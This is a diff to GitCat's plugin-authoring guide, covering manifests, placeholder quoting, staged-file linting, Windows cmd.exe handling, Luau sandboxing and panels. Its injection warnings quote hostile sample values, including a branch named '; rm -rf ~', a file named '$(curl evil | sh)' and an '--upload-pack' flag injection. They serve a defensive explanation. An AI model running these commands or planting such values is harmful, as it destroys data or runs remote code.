@@ -1,15 +1,23 @@
 ---
-description: Author a GitCat plugin — a declarative plugin.json that contributes ⌘K commands and lifecycle hooks backed by your own external commands.
+description: Author a GitCat plugin — a declarative plugin.json that contributes ⌘K commands, lifecycle hooks, panels, diff-highlighting languages and Tama skins; commands and hooks run a shell command or a sandboxed Luau handler.
 ---
 
 # Writing a plugin
 
-A GitCat plugin is a small, **declarative** manifest — a single `plugin.json` file. It doesn't ship code that runs inside GitCat; it contributes two things:
+A GitCat plugin is a small, **declarative** manifest — a single `plugin.json` file. It can contribute:
 
-- **Commands** — actions that show up in the ⌘K command palette and run an external command you specify.
-- **Hooks** — external commands GitCat runs automatically when something happens (a repo opens, a commit is created, an undo runs, …).
+- **Commands** — actions that show up in the ⌘K command palette.
+- **Hooks** — actions GitCat runs automatically when something happens (a repo opens, a commit is created, an undo runs, …).
+- **[Panels](#panels)** — small surfaces built from a fixed set of widgets GitCat renders itself.
+- **[Languages](#languages)** — keyword and comment syntax for diff highlighting.
+- **A [Tama skin](#tama-skins)** — alternate art and voice for Tama.
 
-There is no plugin API, no sandbox, and no in-process JavaScript or Rust. A plugin's only moving part is a shell `run` string — a command line GitCat expands and executes on your machine, exactly like the external diff/merge tools you configure under **External Tools**. That's the whole trust model: **a plugin can do anything the command you wrote can do** (see [Security & trust](#security-trust) at the end).
+Panels, languages and skins are pure data: GitCat draws them, and they run nothing. A command or hook does its work in one of two ways:
+
+- **A shell `run` string** — a command line GitCat expands and executes on your machine, exactly like the external diff/merge tools you configure under **External Tools**. It is **not sandboxed**: it runs with your privileges, so **a `run` command can do anything the command line you wrote can do**.
+- **A [Luau handler](#scripting-with-luau)** — a function in a script the plugin ships, run in an embedded, **sandboxed** Luau VM. The script gets no filesystem, process, or network access; its only reach outward is a `git()` function restricted to an [allowlist](#what-git-allows) of subcommands, which refuses repository-changing ones unless the command declares `"mutates": true`.
+
+There is no in-process JavaScript or Rust plugin API. Either way, install only plugins you trust — see [Security & trust](#security-trust) at the end.
 
 Like the rest of GitCat, plugins are AI-agnostic: GitCat itself contacts no AI service and no network. If you want a plugin that calls an AI, *you* write the `run` line that shells out to your own tool — GitCat only runs it.
 
@@ -110,8 +118,8 @@ Each entry in `commands[]` contributes one invocable action.
 
 | Field | Required | Notes |
 | --- | --- | --- |
-| `id` | ✅ | Unique within the plugin. Combined with the plugin `id` to address the command. |
-| `label` | ✅ | The text shown in ⌘K. |
+| `id` | ✅ | Same `^[a-z0-9][a-z0-9-]*$` charset as a plugin id, and **unique within the plugin** — a duplicate is rejected at install. Combined with the plugin `id` to address the command. |
+| `label` | ✅ | The text shown in ⌘K. Must be non-blank. |
 | `run` | ✳️ | The external command [template](#placeholders). **Declare exactly one of `run` or `handler`.** |
 | `handler` | ✳️ | The name of a [Luau handler](#scripting-with-luau) function instead of a shell `run`. Requires the plugin to declare a top-level `lua` script. **Declare exactly one of `run` or `handler`.** |
 | `context` | — | What selection the command needs. Default `"none"`. |
@@ -125,11 +133,14 @@ Each entry in `commands[]` contributes one invocable action.
 | Value | Meaning |
 | --- | --- |
 | `none` *(default)* | Always applicable; needs no selection. |
-| `commit` | Needs a selected commit (fills `{sha}`). |
+| `commit` | Needs a selected commit (fills `{sha}`, and `{files}` with that commit's changed paths). |
 | `file` | Needs a selected file (fills `{file}`). With nothing selected the command is **not run** — GitCat says so rather than expanding `{file}` to nothing. |
 | `repo` | Repo-scoped — needs only the open repository. |
+| `staged` | Works on the **staged** files: fills `{files}` with the paths currently in the index, read fresh when you run it. Needs **no selection**, so it's the one to use for a pre-commit lint/format command. With nothing staged the command is **not run** — GitCat says "Nothing is staged" rather than expanding `{files}` to nothing. `{file}` and `{sha}` are **not** filled for a `staged` command. |
 
-> **What's populated today.** The built-in ⌘K invocation always fills `{repo}`, and fills `{sha}` for a `commit`-context command. The other tokens are recognized by the expander and reserved for richer selection contexts, but are not yet populated from the palette, so they currently expand to an empty string. Write your templates against the full grammar; just know that `file`/`files`/`diff`/`branch`/`ref` come from the UI later.
+> **Availability.** Every command appears in ⌘K regardless of its `context`; the context is checked when you run it. A `file` command with no file selected, or a `staged` command with nothing staged, is refused with a message from Tama rather than run with an empty token.
+
+> **What's populated today.** The built-in ⌘K invocation always fills `{repo}`; `{sha}` and `{files}` for a `commit` command; `{file}` for a `file` command; `{files}` for a `staged` command. `{diff}`, `{branch}` and `{ref}` are recognized by the expander but not yet populated, so they currently expand to an empty string.
 
 ### `placement`
 
@@ -152,28 +163,53 @@ A `run` string is a template. Before running it, GitCat substitutes `{...}` toke
 | `{repo}` | The repository's path. **Also the working directory** the command runs in. |
 | `{sha}` | The selected commit's id. |
 | `{file}` | The selected file, relative to the repository root. Filled for a `file`-context command, from whichever view is open — the working tree's selection when Uncommitted changes is showing, the commit's otherwise. |
-| `{files}` | Several selected file paths, each quoted, space-joined. |
+| `{files}` | A list of file paths, relative to the repository root, **each quoted as its own argument** and space-joined (a path with spaces stays one argument). For a `commit` command: the paths that commit changed against its first parent (every file, for a root commit). For a `staged` command: the paths currently staged, read when the command runs. **Deleted paths are left out** in both cases — there is no file left to hand a tool. Empty for every other context. See [Linting staged files](#linting-staged-files). |
 | `{diff}` | Diff text. |
 | `{branch}` | A branch name. |
 | `{ref}` | A full ref / tag / symbolic ref. |
 
 **Which tokens are filled today.** `{repo}` always; `{sha}` for a `commit`
-command; `{file}` for a `file` command. `{files}`, `{diff}`, `{branch}` and
-`{ref}` are recognized by the expander but nothing fills them yet, so they
-currently expand to nothing — write your `run` against the three above, and get
-the rest from git itself (your command runs with the repository as its working
-directory, so `git branch --show-current` and friends are right there).
+command; `{file}` for a `file` command; `{files}` for a `commit` or `staged`
+command. `{diff}`, `{branch}` and `{ref}` are recognized by the expander but
+nothing fills them yet, so they currently expand to nothing — write your `run`
+against the four above, and get the rest from git itself (your command runs
+with the repository as its working directory, so `git branch --show-current`
+and friends are right there).
 
 Rules the expander follows:
 
-- **Every substituted value is POSIX single-quoted** so the shell treats it as one inert literal argument — it can't word-split, glob, expand a variable, run a command substitution, or break out of its argument.
+- **Every substituted value is quoted** so the shell treats it as one inert literal argument — it can't word-split, glob, expand a variable, run a command substitution, or break out of its argument. On macOS/Linux that's POSIX single-quoting for `sh`; on Windows it's double-quoting for `cmd.exe` (see [Windows](#windows-caveat)).
 - **The grammar is narrow**: a token is `{` + one-or-more **lowercase ASCII letters** + `}`. Anything else is left verbatim, so your own shell syntax survives untouched — `${HOME}` (uppercase), `${1}` (digit), `awk '{print $1}'` (space), and `{}` are all copied through, not treated as tokens.
 - **Unknown tokens expand to nothing.** An unrecognized `{name}`, or a token whose value is absent, becomes an empty string.
 - **Single pass, no re-expansion.** A value that itself contains `{repo}` or `{sha}` text (e.g. inside a diff) is never re-scanned, so untrusted content can't smuggle in a second placeholder.
 
+### Linting staged files
+
+`{files}` exists because a file list is the one thing a `run` string can't
+build without shell-specific syntax: `eslint $(git diff --cached --name-only)`
+relies on `sh` command substitution, which `cmd /C` on Windows doesn't have. A
+`staged` command gets the list from GitCat instead, with no command
+substitution:
+
+```json
+{
+  "id": "lint-staged",
+  "label": "Lint staged files",
+  "context": "staged",
+  "run": "npx eslint -- {files}"
+}
+```
+
+Each path arrives as its own quoted argument, so a file named `my file.ts` is
+one argument, not two. Put `--` before `{files}` so a file whose name starts
+with `-` is never read as an option (see below). The same line runs unchanged
+on Windows, where each path is double-quoted for `cmd.exe` instead. As with
+every token there, a path containing a `cmd.exe` metacharacter makes GitCat
+refuse the run rather than risk it (see [Windows](#windows-caveat)).
+
 ### Values are untrusted — guard against flag injection
 
-Placeholder values come from whatever repository is open, which a malicious project controls freely: a branch literally named `; rm -rf ~`, a file named `$(curl evil | sh)`, diff text full of backticks. Single-quoting neutralizes all of that as *shell* injection — but it does **not** change argument boundaries. A value that starts with `-` (a branch named `--upload-pack=…`, a ref `-n`) is still handed to your tool as an **option**.
+Placeholder values come from whatever repository is open, which a malicious project controls freely: a branch literally named `; rm -rf ~`, a file named `$(curl evil | sh)`, diff text full of backticks. Quoting neutralizes all of that as *shell* injection — but it does **not** change argument boundaries. A value that starts with `-` (a branch named `--upload-pack=…`, a ref `-n`) is still handed to your tool as an **option**.
 
 **Put a `--` end-of-options separator before any untrusted placeholder:**
 
@@ -184,13 +220,15 @@ Placeholder values come from whatever repository is open, which a malicious proj
 
 ### The command runs in the repo
 
-The expanded command runs with the **repository as its working directory** (the same path `{repo}` expands to). A command invoked with **no repository open is refused** — there's nowhere sensible to run it. Commands are run through the platform shell (`sh -c` on macOS/Linux, `cmd /C` on Windows), so a `run` line can be a full command line with arguments and pipes. There's a **120-second timeout**; stdout is captured (ANSI escapes stripped), and a non-zero exit is reported as a normal outcome, not a hard error.
+The expanded command runs with the **repository as its working directory** (the same path `{repo}` expands to). A command invoked with **no repository open is refused** — there's nowhere sensible to run it. Commands are run through the platform shell (`sh -c` on macOS/Linux, `cmd.exe /S /C` on Windows), so a `run` line can be a full command line with arguments and pipes. There's a **120-second timeout**; stdout is captured (ANSI escapes stripped), and a non-zero exit is reported as a normal outcome, not a hard error.
 
-### Windows caveat
+### Windows {#windows-caveat}
 
-The shell quoting above is POSIX single-quoting, which `cmd.exe` does **not** interpret the same way. So on Windows GitCat **fails closed**: before running, it refuses the command if any substituted value contains a character `cmd.exe` would act on regardless of quoting — `& | < > ^ % ! "` or a carriage return / newline. This blocks injection through a hostile branch/ref/file name, at the cost of refusing some legitimate values. In particular **`{diff}` is almost always refused on Windows** (diffs routinely contain those characters).
+On Windows the template runs under `cmd.exe`, and every placeholder value is **double-quoted** for it (`"a b.txt"`), so a path with spaces is one argument there too. Your template's own text, including its own double quotes, reaches `cmd` exactly as written.
 
-Practically: **write `run` lines for a POSIX shell.** Windows plugins should target Git-Bash or WSL on `PATH` rather than raw `cmd`.
+Double quotes alone can't stop `cmd` from acting on a few characters, so GitCat **fails closed** first: before running, it refuses the command if any substituted value contains `& | < > ^ % ! "` or a carriage return / newline. This blocks injection through a hostile branch/ref/file name, at the cost of refusing some legitimate values. In particular **`{diff}` is almost always refused on Windows** (diffs routinely contain those characters).
+
+The template itself is still `cmd` syntax on Windows and `sh` syntax elsewhere. To write one `run` line that works on both, stick to a program, its arguments, and placeholders: `&&`, `||`, `|`, `>` and "double-quoted" arguments mean the same in both shells. Single quotes, `$VAR`, `$(...)` and backticks are `sh`-only, and the program you name must exist on Windows (`grep`, for one, doesn't ship with it).
 
 ## Hooks
 
@@ -301,7 +339,7 @@ A handler sees exactly four things (nothing else — see [the sandbox](#the-luau
 
 | Name | What it is |
 | --- | --- |
-| `ctx` | A **read-only** table mirroring the [placeholders](#placeholders): `ctx.repo`, `ctx.sha`, `ctx.file`, `ctx.files` (an array), `ctx.diff`, `ctx.branch`, `ctx.ref`. Absent fields are `nil`. (Populated from the UI exactly like the shell tokens — today `ctx.repo` always, plus `ctx.sha` for a `commit`-context command.) Also passed as the handler's argument. |
+| `ctx` | A **read-only** table mirroring the [placeholders](#placeholders): `ctx.repo`, `ctx.sha`, `ctx.file`, `ctx.files` (an array), `ctx.diff`, `ctx.branch`, `ctx.ref`. Absent fields are `nil`. (Populated from the UI exactly like the shell tokens — today `ctx.repo` always, `ctx.sha` and `ctx.files` for a `commit`-context command, `ctx.file` for a `file` command, and `ctx.files` for a `staged` command; `ctx.files` is an empty array otherwise.) Also passed as the handler's argument. |
 | `git(args)` | Run `git` with `args` (an **array of strings**) in the repo — `git({ "log", "-1", "--format=%s" })`. Returns a table `{ stdout, stderr, code, ok }` (`ok` is `true` on a zero exit; `code` is the exit code, or `nil` if signal-killed). **No shell is involved**, so an arg is inert literal data — there is nothing to inject into, unlike the shell `run` path. Only an allowlisted set of git subcommands runs, and repository-changing ones need `"mutates": true` — see [what `git()` allows](#what-git-allows). |
 | `tama.react(kind, msg)` | Nudge Tama's mood. `kind` must be one of `info`, `busy`, `ok`, `problem` (the same [safe allowlist](#tama-reactions) as the `::gitcat.tama` stdout protocol) — any other value is ignored. A script can **never** reach a safety-critical pose. |
 | `print(...)` | Append to the command's captured output (there is no console). Arguments are `tostring`'d and tab-joined, like Lua's `print`. |
@@ -427,6 +465,81 @@ handler this is enforced: without `mutates`, `git()` refuses every
 repository-changing subcommand with a Lua error, so a handler's `git()` writes
 never run outside Undo. See [what `git()` allows](#what-git-allows) and
 [Mutating actions & Undo](#mutating-actions-undo).
+
+## Panels {#panels}
+
+A plugin can declare `panels`: small surfaces that open from ⌘K and show a
+column of **widgets GitCat renders itself**. A panel is data, not code. There
+is no HTML, script, or styling in it, and the only thing a widget can *do* is
+run one of the plugin's **own** commands, through the same path a ⌘K entry
+uses.
+
+```json
+{
+  "id": "my-panel-plugin",
+  "name": "My Panel Plugin",
+  "version": "1.0.0",
+  "commands": [
+    { "id": "status", "label": "Short status", "run": "git status --short", "context": "repo" },
+    { "id": "fetch", "label": "Fetch all remotes", "run": "git fetch --all --prune", "context": "repo" }
+  ],
+  "panels": [
+    {
+      "id": "overview",
+      "title": "Repo overview",
+      "items": [
+        { "type": "heading", "text": "Working tree" },
+        { "type": "text", "text": "Press Re-run to refresh the status below." },
+        { "type": "command-output", "command": "status", "label": "git status --short" },
+        { "type": "button", "label": "Fetch now", "command": "fetch" }
+      ]
+    }
+  ]
+}
+```
+
+### Panel fields
+
+| Field | Required | Type | Notes |
+| --- | --- | --- | --- |
+| `id` | ✅ | string | Same `^[a-z0-9][a-z0-9-]*$` charset as a plugin id, and **unique within the plugin**. |
+| `title` | ✅ | string | Non-blank. It's the panel's ⌘K entry and the heading of the panel window. |
+| `items` | ✅ | array | The widgets, top to bottom. May be empty (the panel then says so). |
+
+### Widgets
+
+Each item is an object with a `type`:
+
+| `type` | Fields | What it shows |
+| --- | --- | --- |
+| `heading` | `text` ✅ | A section heading. |
+| `text` | `text` ✅ | A paragraph of plain text. |
+| `button` | `label` ✅, `command` ✅ | A button that runs command `command` when clicked. The result comes back through Tama, exactly as if you had picked the command in ⌘K (including [Tama reactions](#tama-reactions)). |
+| `command-output` | `command` ✅, `label` — | A box that shows command `command`'s stdout **inline**, verbatim. `label` is an optional caption (the command id is shown if you omit it). It does **not** run when the panel opens, because the command might change the repository. Press **Re-run** to run it. A non-zero exit shows its exit code beside the output, and a valid `::gitcat.tama` line in the output still makes Tama react. |
+
+### Where a panel appears
+
+A panel has **no `placement`**. Each panel adds exactly one ⌘K entry, named by
+its `title` and hinted "Plugin panel · *plugin name*"; choosing it opens the
+panel in a window. A disabled plugin's panels leave ⌘K along with its commands.
+
+### Rules checked at install
+
+- The panel `id` is valid and unique within the plugin, and `title` is non-blank.
+- `heading` / `text` `text`, a `button`'s `label`, and a `command-output`'s
+  `label` (when present) are non-blank.
+- A `button` or `command-output` `command` must be the `id` of a command **in
+  the same plugin**. A missing one is rejected, not ignored. The command's
+  `placement` doesn't matter, so a `"menu"`-only command can still back a widget.
+- An unknown `type`, or an unknown key on a panel or widget, is rejected like
+  any other key GitCat doesn't understand.
+
+A widget's command runs with the context **it** declares: a `file` command run
+from a panel still needs a selected file, and a `staged` command still needs
+something staged. A `mutates: true` command still takes its safety snapshot.
+
+[`staged-review`](https://github.com/zangjiucheng/GitCat/tree/main/examples/plugins/staged-review)
+in the examples is a complete plugin with a panel that uses all four widgets.
 
 ## Tama skins {#tama-skins}
 
@@ -566,14 +679,14 @@ Plugins install from a local file, or from the **Browse** tab that fetches one
 for you — see [Finding plugins](#finding-plugins) above. Either way the review
 step below is the same.
 
-1. Open **Settings → Plugins**.
-2. Click **Install plugin…** and pick the plugin's `plugin.json` file (open the plugin's folder and select its `plugin.json`).
+1. Open **Tools ▸ Plugins…** (or run "Plugins" from ⌘K).
+2. Click **Install from file…** and pick the plugin's `plugin.json` file (open the plugin's folder and select its `plugin.json`, not the folder itself).
 3. GitCat parses and validates the manifest and shows you **what it runs** — every command's `run` template, every hook and its event, anything marked `mutates`, and the folder it loads from. Nothing is installed until you confirm.
 4. The plugin appears in the list, enabled by default. Its commands are immediately available in ⌘K.
 
 Selecting an installed plugin in the same panel shows that identical view, so you can check later what you agreed to at install time.
 
-From the same tab you can:
+From the same window you can:
 
 - **Enable / disable** a plugin with its toggle. A disabled plugin's commands and hooks stop running immediately — the check is in the backend, so it holds even for a second GitCat window whose command palette was listed before you flipped the toggle (each window is a separate process and keeps its own cached list). That window may still *show* the commands until it reloads its registry; running one reports that the plugin is disabled rather than executing it.
 - **Remove** a plugin. This only drops it from GitCat's registry — your original `plugin.json` file on disk is untouched, so you can reinstall it later.
@@ -594,6 +707,8 @@ This file stores the *installed* manifests (GitCat copies them in at install tim
 
 A plugin's `run` string is a **user-authored external command that runs on your machine** — the same trust boundary as an external diff/merge tool `cmd`. Install a plugin only if you'd be comfortable running its commands yourself in a terminal. GitCat never evaluates the `run` string in-process, and it contacts no AI service or network on its own; whatever a plugin does lives entirely inside its own commands.
 
+A [Luau handler](#scripting-with-luau) is narrower: it runs in the [sandbox](#the-luau-sandbox), and its only way out is `git()` with [an allowlist](#what-git-allows). That allowlist still runs real git in your repository, so treat a scripted plugin like any other code you install. Panels, languages and Tama skins are declarative data and run nothing of their own.
+
 A few limits worth knowing while the plugin security model is still being built out:
 
 - <a id="mutating-actions-undo"></a>**Mutating actions & Undo.** GitCat snapshots `HEAD` and every local branch before its own history-changing operations so global Undo can rewind them. A plugin command or hook that changes the repo (`git reset --hard`, `git checkout`, etc.) gets the same protection **when it declares `"mutates": true`**: GitCat takes a snapshot before running it, so the branch and `HEAD` movement is covered by Undo. Like any snapshot, it doesn't capture uncommitted changes — working-tree edits a `git reset --hard` throws away can't be brought back by Undo. A command declared this way that can't be snapshotted is **refused** rather than run unprotected. A mutating action that does **not** set `mutates` runs **outside** Undo (and takes no snapshot) — so **always set `"mutates": true` on anything that changes the repo.** GitCat can't infer it from your opaque `run` string.
@@ -602,4 +717,4 @@ A few limits worth knowing while the plugin security model is still being built 
 
 ## Example plugins {#example-plugins}
 
-Ready-to-read manifests live in [`examples/plugins/`](https://github.com/zangjiucheng/GitCat/tree/main/examples/plugins) in the repository — copy one, edit its `id`/`run` lines, and install it from **Settings → Plugins** to get started. The same ones (plus anything else contributed since) are also mirrored under `official/` in the [community index](#finding-plugins), alongside third-party plugins.
+Ready-to-read manifests live in [`examples/plugins/`](https://github.com/zangjiucheng/GitCat/tree/main/examples/plugins) in the repository — copy one, edit its `id`/`run` lines, and install it from **Tools ▸ Plugins…** to get started. The same ones (plus anything else contributed since) are also mirrored under `official/` in the [community index](#finding-plugins), alongside third-party plugins.
